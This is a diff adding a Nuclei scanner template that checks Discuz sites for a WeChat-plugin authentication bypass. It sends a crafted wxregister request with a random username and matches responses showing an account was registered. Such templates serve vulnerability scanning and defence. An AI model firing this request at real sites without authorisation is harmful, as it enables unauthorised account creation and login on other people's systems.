@@ -1,0 +1,27 @@
+id: poc-yaml-discuz-wechat-random-login
+info:
+  name: Discuz Wechat Random Login
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+
+variables:
+  r_name: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        GET /plugin.php?id=wechat:wechat&ac=wxregister&username={{r_name}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 302 && contains(header_location, ".com/?c=site&a=wxuserregister")
+      - type: dsl
+        dsl:
+          - status_code == 200 && contains(body, "帐号已成功注册") && contains(body, r_name)
+      - type: dsl
+        dsl:
+          - status_code == 200 && contains(body, "<span class=\"username\">") && contains(body, r_name)
